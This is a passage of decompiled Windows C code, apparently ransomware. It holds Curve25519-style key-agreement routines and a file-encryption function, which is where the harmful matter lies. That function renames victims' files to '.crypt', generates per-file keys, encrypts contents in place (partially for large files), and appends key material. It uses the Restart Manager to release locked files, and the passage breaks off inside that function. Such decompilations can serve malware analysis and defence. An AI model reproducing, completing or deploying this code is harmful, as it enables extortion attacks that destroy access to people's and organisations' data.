  int v64; // edx
  int v65; // edi
  int v66; // esi
  int v67; // edx
  int v68; // edi
  __int64 v69; // rax
  int v70; // edx
  __int64 v71; // kr38_8
  int v72; // esi
  int v73; // edx
  int v74; // edi
  int v75; // esi
  int v76; // edx
  int v77; // edi
  __int64 v78; // rax
  int v79; // edx
  int result; // eax

  v2 = *a2;
  v3 = sub_413080(a2[1], 8u) | v2;
  v4 = sub_413080(a2[2], 0x10u) | v3;
  *a1 = (sub_413080(a2[3], 0x18u) | v4) & 0x3FFFFFF;
  a1[1] = 0;
  v5 = a2[3];
  v6 = sub_413080(a2[4], 8u) | v5;
  v8 = v7 | HIDWORD(v5);
  v9 = sub_413080(a2[5], 0x10u) | v6;
  v11 = v10 | v8;
  LODWORD(v12) = sub_413080(a2[6], 0x18u) | v9;
  HIDWORD(v12) = v13 | v11;
  a1[2] = sub_4130A0(v12, 2u) & 0x1FFFFFF;
  a1[3] = 0;
  v14 = a2[6];
  v15 = sub_413080(a2[7], 8u) | v14;
  v17 = v16 | HIDWORD(v14);
  v18 = sub_413080(a2[8], 0x10u) | v15;
  v20 = v19 | v17;
  LODWORD(v21) = sub_413080(a2[9], 0x18u) | v18;
  HIDWORD(v21) = v22 | v20;
  a1[4] = sub_4130A0(v21, 3u) & 0x3FFFFFF;
  a1[5] = 0;
  v23 = a2[9];
  v24 = sub_413080(a2[10], 8u) | v23;
  v26 = v25 | HIDWORD(v23);
  v27 = sub_413080(a2[11], 0x10u) | v24;
  v29 = v28 | v26;
  LODWORD(v30) = sub_413080(a2[12], 0x18u) | v27;
  HIDWORD(v30) = v31 | v29;
  a1[6] = sub_4130A0(v30, 5u) & 0x1FFFFFF;
  a1[7] = 0;
  v32 = a2[12];
  v33 = sub_413080(a2[13], 8u) | v32;
  v35 = v34 | HIDWORD(v32);
  v36 = sub_413080(a2[14], 0x10u) | v33;
  v38 = v37 | v35;
  LODWORD(v39) = sub_413080(a2[15], 0x18u) | v36;
  HIDWORD(v39) = v40 | v38;
  a1[8] = sub_4130A0(v39, 6u) & 0x3FFFFFF;
  a1[9] = 0;
  v41 = a2[16];
  v42 = sub_413080(a2[17], 8u) | v41;
  v43 = sub_413080(a2[18], 0x10u) | v42;
  a1[10] = (sub_413080(a2[19], 0x18u) | v43) & 0x1FFFFFF;
  a1[11] = 0;
  v44 = a2[19];
  v45 = sub_413080(a2[20], 8u) | v44;
  v47 = v46 | HIDWORD(v44);
  v48 = sub_413080(a2[21], 0x10u) | v45;
  v50 = v49 | v47;
  LODWORD(v51) = sub_413080(a2[22], 0x18u) | v48;
  HIDWORD(v51) = v52 | v50;
  a1[12] = sub_4130A0(v51, 1u) & 0x3FFFFFF;
  a1[13] = 0;
  v53 = a2[22];
  v54 = sub_413080(a2[23], 8u) | v53;
  v56 = v55 | HIDWORD(v53);
  v57 = sub_413080(a2[24], 0x10u) | v54;
  v59 = v58 | v56;
  LODWORD(v60) = sub_413080(a2[25], 0x18u) | v57;
  HIDWORD(v60) = v61 | v59;
  a1[14] = sub_4130A0(v60, 3u) & 0x1FFFFFF;
  a1[15] = 0;
  v62 = a2[25];
  v63 = sub_413080(a2[26], 8u) | v62;
  v65 = v64 | HIDWORD(v62);
  v66 = sub_413080(a2[27], 0x10u) | v63;
  v68 = v67 | v65;
  LODWORD(v69) = sub_413080(a2[28], 0x18u) | v66;
  HIDWORD(v69) = v70 | v68;
  a1[16] = sub_4130A0(v69, 4u) & 0x3FFFFFF;
  a1[17] = 0;
  v71 = a2[28];
  v72 = sub_413080(a2[29], 8u) | v71;
  v74 = v73 | HIDWORD(v71);
  v75 = sub_413080(a2[30], 0x10u) | v72;
  v77 = v76 | v74;
  LODWORD(v78) = sub_413080(a2[31], 0x18u) | v75;
  HIDWORD(v78) = v79 | v77;
  result = sub_4130A0(v78, 6u) & 0x1FFFFFF;
  a1[18] = result;
  a1[19] = 0;
  return result;
}
// 407C41: variable 'v7' is possibly undefined
// 407C5C: variable 'v10' is possibly undefined
// 407C7B: variable 'v13' is possibly undefined
// 407CCB: variable 'v16' is possibly undefined
// 407CE6: variable 'v19' is possibly undefined
// 407D05: variable 'v22' is possibly undefined
// 407D54: variable 'v25' is possibly undefined
// 407D6F: variable 'v28' is possibly undefined
// 407D8E: variable 'v31' is possibly undefined
// 407DDE: variable 'v34' is possibly undefined
// 407DF9: variable 'v37' is possibly undefined
// 407E18: variable 'v40' is possibly undefined
// 407EE8: variable 'v46' is possibly undefined
// 407F03: variable 'v49' is possibly undefined
// 407F22: variable 'v52' is possibly undefined
// 407F72: variable 'v55' is possibly undefined
// 407F8D: variable 'v58' is possibly undefined
// 407FAC: variable 'v61' is possibly undefined
// 407FFC: variable 'v64' is possibly undefined
// 408017: variable 'v67' is possibly undefined
// 408036: variable 'v70' is possibly undefined
// 408086: variable 'v73' is possibly undefined
// 4080A1: variable 'v76' is possibly undefined
// 4080C0: variable 'v79' is possibly undefined

//----- (004080F0) --------------------------------------------------------
int __cdecl sub_4080F0(int a1, int a2)
{
  int v3; // [esp+8h] [ebp+8h]
  int v4; // [esp+8h] [ebp+8h]

  v3 = ~(a2 ^ a1) & (~(a2 ^ a1) << 16);
  v4 = v3 & (v3 << 8) & (16 * (v3 & (v3 << 8)));
  return (v4 & (4 * v4) & (2 * (v4 & (4 * v4)))) >> 31;
}

//----- (00408150) --------------------------------------------------------
int __cdecl sub_408150(int a1, int a2)
{
  return ~((a1 - a2) >> 31);
}

//----- (00408170) --------------------------------------------------------
int __cdecl sub_408170(int a1, int a2)
{
  int v2; // eax
  int result; // eax
  int v4; // [esp+0h] [ebp-60h]
  int v5; // [esp+4h] [ebp-5Ch]
  int v6; // [esp+8h] [ebp-58h]
  int v7; // [esp+Ch] [ebp-54h]
  int v8; // [esp+10h] [ebp-50h]
  char v9; // [esp+14h] [ebp-4Ch]
  char v10; // [esp+15h] [ebp-4Bh]
  char v11; // [esp+16h] [ebp-4Ah]
  char v12; // [esp+17h] [ebp-49h]
  int v13; // [esp+18h] [ebp-48h]
  int v14; // [esp+1Ch] [ebp-44h]
  int v15; // [esp+20h] [ebp-40h]
  int v16; // [esp+24h] [ebp-3Ch]
  int v17; // [esp+28h] [ebp-38h]
  int v18; // [esp+2Ch] [ebp-34h]
  int v19; // [esp+30h] [ebp-30h]
  int v20; // [esp+34h] [ebp-2Ch]
  int v21; // [esp+38h] [ebp-28h]
  int v22; // [esp+3Ch] [ebp-24h]
  int v23; // [esp+40h] [ebp-20h]
  int v24; // [esp+44h] [ebp-1Ch]
  int v25; // [esp+48h] [ebp-18h]
  int v26; // [esp+4Ch] [ebp-14h]
  int v27; // [esp+50h] [ebp-10h]
  int v28; // [esp+54h] [ebp-Ch]
  int j; // [esp+58h] [ebp-8h]
  int i; // [esp+5Ch] [ebp-4h]

  for ( i = 0; i < 10; ++i )
    *(&v4 + i) = *(_DWORD *)(a2 + 8 * i);
  for ( j = 0; j < 2; ++j )
  {
    for ( i = 0; i < 9; ++i )
    {
      if ( (i & 1) != 0 )
      {
        v23 = *(&v4 + i) >> 31;
        v27 = -((v23 & *(&v4 + i)) >> 25);
        *(&v4 + i) += v27 << 25;
        *(&v5 + i) -= v27;
      }
      else
      {
        v22 = *(&v4 + i) >> 31;
        v26 = -((v22 & *(&v4 + i)) >> 26);
        *(&v4 + i) += v26 << 26;
        *(&v5 + i) -= v26;
      }
    }
    v21 = v16 >> 31;
    v25 = -(((v16 >> 31) & v16) >> 25);
    v16 -= ((v16 >> 31) & v16) >> 25 << 25;
    v4 -= 19 * v25;
  }
  v20 = v4 >> 31;
  v24 = -(((v4 >> 31) & v4) >> 26);
  v4 -= ((v4 >> 31) & v4) >> 26 << 26;
  v5 -= v24;
  for ( j = 0; j < 2; ++j )
  {
    for ( i = 0; i < 9; ++i )
    {
      if ( (i & 1) != 0 )
      {
        v19 = *(&v4 + i) >> 25;
        *(&v4 + i) &= 0x1FFFFFFu;
        *(&v5 + i) += v19;
      }
      else
      {
        v18 = *(&v4 + i) >> 26;
        *(&v4 + i) &= 0x3FFFFFFu;
        *(&v5 + i) += v18;
      }
    }
    v17 = v16 >> 25;
    v16 &= 0x1FFFFFFu;
    v4 += 19 * v17;
  }
  v28 = sub_408150(v4, 67108845);
  for ( i = 1; i < 10; ++i )
  {
    if ( (i & 1) != 0 )
      v2 = sub_4080F0(*(&v4 + i), 0x1FFFFFF);
    else
      v2 = sub_4080F0(*(&v4 + i), 0x3FFFFFF);
    v28 &= v2;
  }
  v4 -= v28 & 0x3FFFFED;
  for ( i = 1; i < 10; ++i )
  {
    if ( (i & 1) != 0 )
      *(&v4 + i) -= v28 & 0x1FFFFFF;
    else
      *(&v4 + i) -= v28 & 0x3FFFFFF;
  }
  v5 *= 4;
  v6 *= 8;
  v7 *= 32;
  v8 <<= 6;
  v13 *= 2;
  v14 *= 8;
  v15 *= 16;
  v16 <<= 6;
  *(_BYTE *)a1 = 0;
  *(_BYTE *)(a1 + 16) = 0;
  *(_BYTE *)a1 |= v4;
  *(_WORD *)(a1 + 1) = *(_WORD *)((char *)&v4 + 1);
  *(_BYTE *)(a1 + 3) = HIBYTE(v4);
  *(_BYTE *)(a1 + 3) |= v5;
  *(_WORD *)(a1 + 4) = *(_WORD *)((char *)&v5 + 1);
  *(_BYTE *)(a1 + 6) = HIBYTE(v5);
  *(_BYTE *)(a1 + 6) |= v6;
  *(_WORD *)(a1 + 7) = *(_WORD *)((char *)&v6 + 1);
  *(_BYTE *)(a1 + 9) = HIBYTE(v6);
  *(_BYTE *)(a1 + 9) |= v7;
  *(_WORD *)(a1 + 10) = *(_WORD *)((char *)&v7 + 1);
  *(_BYTE *)(a1 + 12) = HIBYTE(v7);
  *(_BYTE *)(a1 + 12) |= v8;
  *(_WORD *)(a1 + 13) = *(_WORD *)((char *)&v8 + 1);
  *(_BYTE *)(a1 + 15) = HIBYTE(v8);
  *(_BYTE *)(a1 + 16) |= v9;
  *(_BYTE *)(a1 + 17) = v10;
  *(_BYTE *)(a1 + 18) = v11;
  *(_BYTE *)(a1 + 19) = v12;
  *(_BYTE *)(a1 + 19) |= v13;
  *(_WORD *)(a1 + 20) = *(_WORD *)((char *)&v13 + 1);
  *(_BYTE *)(a1 + 22) = HIBYTE(v13);
  *(_BYTE *)(a1 + 22) |= v14;
  *(_WORD *)(a1 + 23) = *(_WORD *)((char *)&v14 + 1);
  *(_BYTE *)(a1 + 25) = HIBYTE(v14);
  *(_BYTE *)(a1 + 25) |= v15;
  *(_WORD *)(a1 + 26) = *(_WORD *)((char *)&v15 + 1);
  *(_BYTE *)(a1 + 28) = HIBYTE(v15);
  *(_BYTE *)(a1 + 28) |= v16;
  *(_WORD *)(a1 + 29) = *(_WORD *)((char *)&v16 + 1);
  result = a1;
  *(_BYTE *)(a1 + 31) = HIBYTE(v16);
  return result;
}

//----- (00408C10) --------------------------------------------------------
int __cdecl sub_408C10(
        unsigned __int64 *a1,
        unsigned __int64 *a2,
        int a3,
        int a4,
        int *a5,
        int *a6,
        int *a7,
        int *a8,
        int *a9)
{
  char v10[152]; // [esp+0h] [ebp-4C8h] BYREF
  int v11[38]; // [esp+98h] [ebp-430h] BYREF
  char v12[80]; // [esp+130h] [ebp-398h] BYREF
  int v13[38]; // [esp+180h] [ebp-348h] BYREF
  int v14[38]; // [esp+218h] [ebp-2B0h] BYREF
  int v15[20]; // [esp+2B0h] [ebp-218h] BYREF
  char v16[72]; // [esp+300h] [ebp-1C8h] BYREF
  unsigned __int64 v17[19]; // [esp+348h] [ebp-180h] BYREF
  char v18[80]; // [esp+3E0h] [ebp-E8h] BYREF
  unsigned __int64 v19[19]; // [esp+430h] [ebp-98h] BYREF

  sub_412DA0((int)v12, (int)a5, 0x50u);
  sub_404F00((int)a5, (int)a6);
  sub_404F80((int)a6, (int)v12);
  sub_412DA0((int)v18, (int)a7, 0x50u);
  sub_404F00((int)a7, (int)a8);
  sub_404F80((int)a8, (int)v18);
  sub_405020(v17, a7, a6);
  sub_405020(v19, a5, a8);
  sub_4064B0(v17);
  sub_406B70((int)v17);
  sub_4064B0(v19);
  sub_406B70((int)v19);
  sub_412DA0((int)v18, (int)v17, 0x50u);
  sub_404F00((int)v17, (int)v19);
  sub_404F80((int)v19, (int)v18);
  sub_407B30((int)v10, (int *)v17);
  sub_407B30((int)v11, (int *)v19);
  sub_405020(v19, v11, a9);
  sub_4064B0(v19);
  sub_406B70((int)v19);
  sub_412DA0(a3, (int)v10, 0x50u);
  sub_412DA0(a4, (int)v19, 0x50u);
  sub_407B30((int)v13, a5);
  sub_407B30((int)v14, a6);
  sub_405020(a1, v13, v14);
  sub_4064B0(a1);
  sub_406B70((int)a1);
  sub_404F80((int)v14, (int)v13);
  sub_412D70((int)v16, 0, 0x48u);
  sub_404FD0((int)v15, (int)v14, 121665i64);
  sub_406B70((int)v15);
  sub_404F00((int)v15, (int)v13);
  sub_405020(a2, v14, v15);
  sub_4064B0(a2);
  return sub_406B70((int)a2);
}
// 408C10: using guessed type unsigned __int64 var_180[19];
// 408C10: using guessed type unsigned __int64 var_98[19];
// 408C10: using guessed type int var_430[38];
// 408C10: using guessed type int var_348[38];
// 408C10: using guessed type int var_2B0[38];
// 408C10: using guessed type char var_1C8[72];
// 408C10: using guessed type int var_218[20];

//----- (00408EC0) --------------------------------------------------------
int __cdecl sub_408EC0(int a1, int a2, int a3)
{
  __int64 v3; // rax
  int v5; // [esp+8h] [ebp-8h]
  unsigned int i; // [esp+Ch] [ebp-4h]

  LODWORD(v3) = -a3;
  for ( i = 0; i < 0xA; ++i )
  {
    v5 = -a3 & (*(_DWORD *)(a2 + 8 * i) ^ *(_DWORD *)(a1 + 8 * i));
    *(_QWORD *)(a1 + 8 * i) = v5 ^ *(_DWORD *)(a1 + 8 * i);
    v3 = v5 ^ *(_DWORD *)(a2 + 8 * i);
    *(_QWORD *)(a2 + 8 * i) = v3;
  }
  return v3;
}

//----- (00408F40) --------------------------------------------------------
unsigned int __cdecl sub_408F40(int a1, int a2, int a3, int *a4)
{
  int v4; // eax
  int v5; // ecx
  int v6; // edx
  int v7; // eax
  int v8; // ecx
  int v9; // edx
  int v10; // eax
  int v11; // ecx
  int v13[38]; // [esp+0h] [ebp-4FCh] BYREF
  int v14[38]; // [esp+98h] [ebp-464h] BYREF
  int v15[38]; // [esp+130h] [ebp-3CCh] BYREF
  int v16[38]; // [esp+1C8h] [ebp-334h] BYREF
  int v17; // [esp+260h] [ebp-29Ch] BYREF
  _DWORD v18[37]; // [esp+264h] [ebp-298h]
  int v19; // [esp+2F8h] [ebp-204h] BYREF
  _DWORD v20[37]; // [esp+2FCh] [ebp-200h]
  int v21; // [esp+390h] [ebp-16Ch] BYREF
  _DWORD v22[37]; // [esp+394h] [ebp-168h]
  int v23; // [esp+428h] [ebp-D4h] BYREF
  _DWORD v24[37]; // [esp+42Ch] [ebp-D0h]
  unsigned int k; // [esp+4C0h] [ebp-3Ch]
  __int64 v26; // [esp+4C4h] [ebp-38h]
  int *v27; // [esp+4CCh] [ebp-30h]
  int *v28; // [esp+4D0h] [ebp-2Ch]
  int *v29; // [esp+4D4h] [ebp-28h]
  unsigned __int64 *v30; // [esp+4D8h] [ebp-24h]
  unsigned __int64 *v31; // [esp+4DCh] [ebp-20h]
  unsigned int j; // [esp+4E0h] [ebp-1Ch]
  int *v33; // [esp+4E4h] [ebp-18h]
  int *v34; // [esp+4E8h] [ebp-14h]
  int *v35; // [esp+4ECh] [ebp-10h]
  int *v36; // [esp+4F0h] [ebp-Ch]
  int i; // [esp+4F4h] [ebp-8h]
  unsigned __int8 v38; // [esp+4FBh] [ebp-1h]

  v35 = v16;
  v28 = &v23;
  v34 = &v21;
  v33 = v15;
  v29 = v14;
  v27 = &v19;
  v31 = (unsigned __int64 *)v13;
  v30 = (unsigned __int64 *)&v17;
  for ( i = 0; i < 19; ++i )
  {
    v4 = i;
    v16[2 * i] = 0;
    v16[2 * v4 + 1] = 0;
    v5 = i;
    v24[2 * i - 1] = 0;
    v24[2 * v5] = 0;
    v6 = i;
    v22[2 * i - 1] = 0;
    v22[2 * v6] = 0;
    v7 = i;
    v15[2 * i] = 0;
    v15[2 * v7 + 1] = 0;
    v8 = i;
    v14[2 * i] = 0;
    v14[2 * v8 + 1] = 0;
    v9 = i;
    v20[2 * i - 1] = 0;
    v20[2 * v9] = 0;
    v10 = i;
    v13[2 * i] = 0;
    v13[2 * v10 + 1] = 0;
    v11 = i;
    v18[2 * i - 1] = 0;
    v18[2 * v11] = 0;
  }
  v23 = 1;
  v24[0] = 0;
  v21 = 1;
  v22[0] = 0;
  v19 = 1;
  v20[0] = 0;
  v17 = 1;
  v18[0] = 0;
  sub_412DA0((int)v35, (int)a4, 0x50u);
  for ( j = 0; j < 0x20; ++j )
  {
    v38 = *(_BYTE *)(a3 + 31 - j);
    for ( k = 0; k < 8; ++k )
    {
      v26 = (int)v38 >> 7;
      sub_408EC0((int)v34, (int)v35, (int)v38 >> 7);
      sub_408EC0((int)v33, (int)v28, v26);
      sub_408C10(v31, v30, (int)v29, (int)v27, v34, v33, v35, v28, a4);
      sub_408EC0((int)v31, (int)v29, v26);
      sub_408EC0((int)v30, (int)v27, v26);
      v36 = v34;
      v34 = (int *)v31;
      v31 = (unsigned __int64 *)v36;
      v36 = v33;
      v33 = (int *)v30;
      v30 = (unsigned __int64 *)v36;
      v36 = v35;
      v35 = v29;
      v29 = v36;
      v36 = v28;
      v28 = v27;
      v27 = v36;
      v38 *= 2;
    }
  }
  sub_412DA0(a1, (int)v34, 0x50u);
  return sub_412DA0(a2, (int)v33, 0x50u);
}
// 408F40: using guessed type _DWORD var_D0[37];
// 408F40: using guessed type _DWORD var_168[37];
// 408F40: using guessed type _DWORD var_200[37];
// 408F40: using guessed type _DWORD var_298[37];

//----- (00409270) --------------------------------------------------------
unsigned int __cdecl sub_409270(int a1, int *a2)
{
  int v3[20]; // [esp+0h] [ebp-324h] BYREF
  int v4[20]; // [esp+50h] [ebp-2D4h] BYREF
  int v5[20]; // [esp+A0h] [ebp-284h] BYREF
  int v6[20]; // [esp+F0h] [ebp-234h] BYREF
  int v7[20]; // [esp+140h] [ebp-1E4h] BYREF
  int v8[20]; // [esp+190h] [ebp-194h] BYREF
  int v9[20]; // [esp+1E0h] [ebp-144h] BYREF
  int v10[20]; // [esp+230h] [ebp-F4h] BYREF
  int v11[20]; // [esp+280h] [ebp-A4h] BYREF
  int v12[20]; // [esp+2D0h] [ebp-54h] BYREF
  int i; // [esp+320h] [ebp-4h]

  sub_407B30((int)v8, a2);
  sub_407B30((int)v11, v8);
  sub_407B30((int)v12, v11);
  sub_406DE0((int)v7, v12, a2);
  sub_406DE0((int)v3, v7, v8);
  sub_407B30((int)v12, v3);
  sub_406DE0((int)v6, v12, v7);
  sub_407B30((int)v12, v6);
  sub_407B30((int)v11, v12);
  sub_407B30((int)v12, v11);
  sub_407B30((int)v11, v12);
  sub_407B30((int)v12, v11);
  sub_406DE0((int)v10, v12, v6);
  sub_407B30((int)v12, v10);
  sub_407B30((int)v11, v12);
  for ( i = 2; i < 10; i += 2 )
  {
    sub_407B30((int)v12, v11);
    sub_407B30((int)v11, v12);
  }
  sub_406DE0((int)v5, v11, v10);
  sub_407B30((int)v12, v5);
  sub_407B30((int)v11, v12);
  for ( i = 2; i < 20; i += 2 )
  {
    sub_407B30((int)v12, v11);
    sub_407B30((int)v11, v12);
  }
  sub_406DE0((int)v12, v11, v5);
  sub_407B30((int)v11, v12);
  sub_407B30((int)v12, v11);
  for ( i = 2; i < 10; i += 2 )
  {
    sub_407B30((int)v11, v12);
    sub_407B30((int)v12, v11);
  }
  sub_406DE0((int)v9, v12, v10);
  sub_407B30((int)v12, v9);
  sub_407B30((int)v11, v12);
  for ( i = 2; i < 50; i += 2 )
  {
    sub_407B30((int)v12, v11);
    sub_407B30((int)v11, v12);
  }
  sub_406DE0((int)v4, v11, v9);
  sub_407B30((int)v11, v4);
  sub_407B30((int)v12, v11);
  for ( i = 2; i < 100; i += 2 )
  {
    sub_407B30((int)v11, v12);
    sub_407B30((int)v12, v11);
  }
  sub_406DE0((int)v11, v12, v4);
  sub_407B30((int)v12, v11);
  sub_407B30((int)v11, v12);
  for ( i = 2; i < 50; i += 2 )
  {
    sub_407B30((int)v12, v11);
    sub_407B30((int)v11, v12);
  }
  sub_406DE0((int)v12, v11, v9);
  sub_407B30((int)v11, v12);
  sub_407B30((int)v12, v11);
  sub_407B30((int)v11, v12);
  sub_407B30((int)v12, v11);
  sub_407B30((int)v11, v12);
  return sub_406DE0(a1, v11, v3);
}
// 409270: using guessed type int var_194[20];
// 409270: using guessed type int var_A4[20];
// 409270: using guessed type int var_54[20];
// 409270: using guessed type int var_1E4[20];
// 409270: using guessed type int var_324[20];
// 409270: using guessed type int var_234[20];
// 409270: using guessed type int var_F4[20];
// 409270: using guessed type int var_284[20];
// 409270: using guessed type int var_144[20];
// 409270: using guessed type int var_2D4[20];

//----- (00409720) --------------------------------------------------------
WCHAR *__cdecl sub_409720(LPCWSTR lpFileName)
{
  int v1; // eax
  WCHAR *result; // eax
  int v3; // edx
  __int64 v4; // rax
  LONG v5; // edx
  int v6; // eax
  int v7; // eax
  int LastError; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  CHAR *v21; // [esp-10h] [ebp-2CD0h]
  CHAR *v22; // [esp-10h] [ebp-2CD0h]
  CHAR *v23; // [esp-10h] [ebp-2CD0h]
  CHAR *v24; // [esp-10h] [ebp-2CD0h]
  CHAR *v25; // [esp-10h] [ebp-2CD0h]
  int v26; // [esp-Ch] [ebp-2CCCh]
  int v27; // [esp-Ch] [ebp-2CCCh]
  int v28; // [esp-Ch] [ebp-2CCCh]
  int v29; // [esp-Ch] [ebp-2CCCh]
  int v30; // [esp-Ch] [ebp-2CCCh]
  RM_PROCESS_INFO dwProcessId[10]; // [esp+0h] [ebp-2CC0h] BYREF
  _DWORD v32[1057]; // [esp+1A18h] [ebp-12A8h] BYREF
  char v33[72]; // [esp+2A9Ch] [ebp-224h] BYREF
  WCHAR v34[34]; // [esp+2AE4h] [ebp-1DCh] BYREF
  char v35[32]; // [esp+2B28h] [ebp-198h] BYREF
  char v36[32]; // [esp+2B48h] [ebp-178h] BYREF
  char Buffer[32]; // [esp+2B68h] [ebp-158h] BYREF
  int v38; // [esp+2B88h] [ebp-138h]
  int v39[8]; // [esp+2B90h] [ebp-130h] BYREF
  char v40[32]; // [esp+2BB0h] [ebp-110h] BYREF
  BYTE pbBuffer[31]; // [esp+2BD0h] [ebp-F0h] BYREF
  char v42; // [esp+2BEFh] [ebp-D1h]
  DWORD dwRebootReasons; // [esp+2BF0h] [ebp-D0h] BYREF
  UINT pnProcInfoNeeded; // [esp+2BF4h] [ebp-CCh] BYREF
  unsigned __int8 v45; // [esp+2BF8h] [ebp-C8h] BYREF
  int v46; // [esp+2BF9h] [ebp-C7h]
  int v47; // [esp+2BFDh] [ebp-C3h]
  int v48; // [esp+2C01h] [ebp-BFh]
  int v49; // [esp+2C05h] [ebp-BBh]
  int v50; // [esp+2C09h] [ebp-B7h]
  int v51; // [esp+2C0Dh] [ebp-B3h]
  int v52; // [esp+2C11h] [ebp-AFh]
  __int16 v53; // [esp+2C15h] [ebp-ABh]
  char v54; // [esp+2C17h] [ebp-A9h]
  LARGE_INTEGER nNumberOfBytesToRead; // [esp+2C18h] [ebp-A8h]
  __int64 v56; // [esp+2C20h] [ebp-A0h]
  __int64 v57; // [esp+2C28h] [ebp-98h]
  LARGE_INTEGER v58; // [esp+2C30h] [ebp-90h]
  UINT pnProcInfo; // [esp+2C38h] [ebp-88h] BYREF
  int v60; // [esp+2C3Ch] [ebp-84h]
  int v61; // [esp+2C40h] [ebp-80h]
  int v62; // [esp+2C44h] [ebp-7Ch]
  int v63; // [esp+2C48h] [ebp-78h]
  int v64; // [esp+2C4Ch] [ebp-74h]
  int v65; // [esp+2C50h] [ebp-70h]
  int v66; // [esp+2C54h] [ebp-6Ch]
  int v67; // [esp+2C58h] [ebp-68h]
  int v68; // [esp+2C5Ch] [ebp-64h]
  int cbMultiByte; // [esp+2C60h] [ebp-60h]
  __int64 i; // [esp+2C64h] [ebp-5Ch]
  __int64 j; // [esp+2C6Ch] [ebp-54h]
  LPSTR v72; // [esp+2C74h] [ebp-4Ch]
  LPSTR v73; // [esp+2C78h] [ebp-48h]
  LPSTR v74; // [esp+2C7Ch] [ebp-44h]
  DWORD pSessionHandle; // [esp+2C80h] [ebp-40h] BYREF
  LPSTR v76; // [esp+2C84h] [ebp-3Ch]
  LPSTR v77; // [esp+2C88h] [ebp-38h]
  LPSTR lpMultiByteStr; // [esp+2C8Ch] [ebp-34h]
  DWORD NumberOfBytesWritten; // [esp+2C90h] [ebp-30h] BYREF
  HANDLE hProcess; // [esp+2C94h] [ebp-2Ch]
  LPWSTR lpString1; // [esp+2C98h] [ebp-28h]
  DWORD NumberOfBytesRead; // [esp+2C9Ch] [ebp-24h] BYREF
  LARGE_INTEGER FileSize; // [esp+2CA0h] [ebp-20h] BYREF
  int v84; // [esp+2CA8h] [ebp-18h]
  LARGE_INTEGER liDistanceToMove; // [esp+2CACh] [ebp-14h]
  UINT k; // [esp+2CB4h] [ebp-Ch]
  LPVOID lpBuffer; // [esp+2CB8h] [ebp-8h]
  HANDLE hFile; // [esp+2CBCh] [ebp-4h]

  v45 = 9;
  v46 = 0;
  v47 = 0;
  v48 = 0;
  v49 = 0;
  v50 = 0;
  v51 = 0;
  v52 = 0;
  v53 = 0;
  v54 = 0;
  v66 = 1;
  qmemcpy(v39, "choung dong looks like hot dog!!", sizeof(v39));
  SetFileAttributesW(lpFileName, 0x80u);
  v1 = lstrlenW(lpFileName);
  result = (WCHAR *)sub_412DE0(2 * v1 + 14);
  lpString1 = result;
  if ( result )
  {
    lstrcpyW(lpString1, lpFileName);
    lstrcatW(lpString1, L".crypt");
    result = (WCHAR *)MoveFileExW(lpFileName, lpString1, 9u);
    if ( result )
    {
      while ( 1 )
      {
        hFile = CreateFileW(lpString1, 0xC0000000, 0, 0, 3u, 0x8000000u, 0);
        result = (WCHAR *)sub_412E10(lpString1);
        if ( hFile != (HANDLE)-1 )
        {
          GetFileSizeEx(hFile, &FileSize);
          lpBuffer = sub_412DE0(0x100000);
          if ( lpBuffer )
          {
            CryptGenRandom(hProv, 0x20u, pbBuffer);
            pbBuffer[0] &= 0xF8u;
            v42 &= ~0x80u;
            v42 |= 0x40u;
            sub_404E00((int)Buffer, (int)pbBuffer, &v45);
            sub_404E00((int)v40, (int)pbBuffer, byte_4141B8);
            sub_410A30((int)v40, 0x20u, (int)v35);
            sub_40FDD0((int)v32, (int)v35, 0x100u, 0x100u);
            sub_40FE60(v32, (int)v36);
            v38 = sub_4104D0(v35, 64);
            sub_412D70((int)v33, 0, 0x40u);
            sub_412D70((int)v35, 0, 0x40u);
            sub_412D70((int)v40, 0, 0x40u);
            liDistanceToMove.QuadPart = 0i64;
            SetFilePointerEx(hFile, 0i64, 0, 0);
            if ( FileSize.QuadPart <= 20971520 )
            {
              if ( FileSize.QuadPart <= 5242880 )
              {
                if ( FileSize.QuadPart > 0 )
                {
                  if ( FileSize.QuadPart <= 64 )
                  {
                    v58 = FileSize;
                  }
                  else
                  {
                    v58.LowPart = sub_4130F0(FileSize.QuadPart, 10i64);
                    v58.HighPart = v5;
                  }
                  nNumberOfBytesToRead = v58;
                  ReadFile(hFile, lpBuffer, v58.LowPart, &NumberOfBytesRead, 0);
                  sub_4101C0(0, v32, lpBuffer, (int *)lpBuffer, NumberOfBytesRead);
                  SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
                  WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesWritten, 0);
                }
              }
              else
              {
                LODWORD(v4) = sub_4130F0(FileSize.QuadPart, 3i64);
                v56 = v4;
                for ( i = 0i64; i < 3; ++i )
                {
                  ReadFile(hFile, lpBuffer, 0x100000u, &NumberOfBytesRead, 0);
                  sub_4101C0(0, v32, lpBuffer, (int *)lpBuffer, NumberOfBytesRead);
                  SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
                  WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesWritten, 0);
                  liDistanceToMove.QuadPart += v56;
                  SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
                }
              }
            }
            else
            {
              LODWORD(v57) = sub_4130F0(FileSize.QuadPart, 10485760i64);
              HIDWORD(v57) = v3;
              for ( j = 0i64; j < v57; ++j )
              {
                ReadFile(hFile, lpBuffer, 0x100000u, &NumberOfBytesRead, 0);
                sub_4101C0(0, v32, lpBuffer, (int *)lpBuffer, NumberOfBytesRead);
                SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
                WriteFile(hFile, lpBuffer, 0x100000u, &NumberOfBytesWritten, 0);
                liDistanceToMove.QuadPart += 10485760i64;
                SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
              }
            }
            sub_412D70((int)v32, 0, 0x10CCu);
            liDistanceToMove.QuadPart = 0i64;
            SetFilePointerEx(hFile, 0i64, 0, 2u);
            WriteFile(hFile, Buffer, 0x48u, &NumberOfBytesWritten, 0);
            sub_412E10(lpBuffer);
          }
          return (WCHAR *)CloseHandle(hFile);
        }
        if ( !v66 )
          break;
        v84 = 0;
        sub_412D70((int)v34, 0, 0x42u);
        result = (WCHAR *)RmStartSession(&pSessionHandle, 0, v34);
        v62 = result == 0;
        v84 = v62;
        if ( result )
        {
          if ( dword_41425C )
          {
            v13 = lstrlenW(lpFileName);
